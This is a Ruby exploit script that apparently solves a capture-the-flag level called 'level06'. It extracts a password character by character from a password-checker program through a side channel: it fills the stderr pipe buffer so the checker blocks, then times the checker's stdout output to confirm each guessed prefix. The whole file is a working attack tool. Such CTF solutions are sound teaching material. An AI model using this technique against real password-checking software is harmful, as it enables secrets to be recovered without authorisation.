#!/usr/bin/env ruby
# Thanks to Matt Page <mpage@cs.stanford.edu>
BANNER_LEN = "Welcome to the password checker!\n".size
PIPE_BUF_SIZE = 2 ** 16

def check_guess(level_path, pwfile_path, guess)
 child_stderr = IO.pipe
 child_stdout = IO.pipe

 #system('clear')
 puts guess

 child_stderr[1].write("A" * (PIPE_BUF_SIZE - BANNER_LEN - guess.size))

 pid = fork do
   # Hook up write ends
   $stdout.reopen(child_stdout[1])
   $stderr.reopen(child_stderr[1])

   # Close read ends
   [child_stderr, child_stdout].map {|ios| ios[0].close }

   exec("#{level_path} #{pwfile_path} #{guess}x")
   # NOTREACHED
   exit(0)
 end

 # Close our write ends
 [child_stderr, child_stdout].map {|ios| ios[1].close }

 # 100ms *should* be enough time for the forked child to write to stdout
 # when we're wrong
 guess_correct = IO.select([child_stdout[0]], nil, nil, 0.1) == nil

 Process.kill("KILL", pid)
 Process.waitpid(pid)

 guess_correct
ensure
 [child_stderr, child_stdout].flatten.each {|io| io.close unless io.closed? }
end

unless ARGV.size == 2
 puts "Usage: exploit06.rb [/path/to/level06] [/path/to/password_file]"
 exit 1
end

level_path, pwfile_path = ARGV

charset = ['a'..'z', 'A'..'Z', '0'..'9'].map {|x| x.to_a}.flatten
accum = ''
while nil == `#{level_path} #{pwfile_path} #{accum} 2>&1`.match('Wait')
 #system('clear')
 #puts "RETRIEVED THUS FAR: '#{accum}'"

 retrieved_char = nil
 charset.each do |guess|
   if check_guess(level_path, pwfile_path, accum + guess)
     retrieved_char = guess
     accum += guess
     break
   end
 end

 unless retrieved_char
   abort("FAILED TO RETRIEVE CHARACTER")
 end
end

puts "PASSWORD: #{accum}"
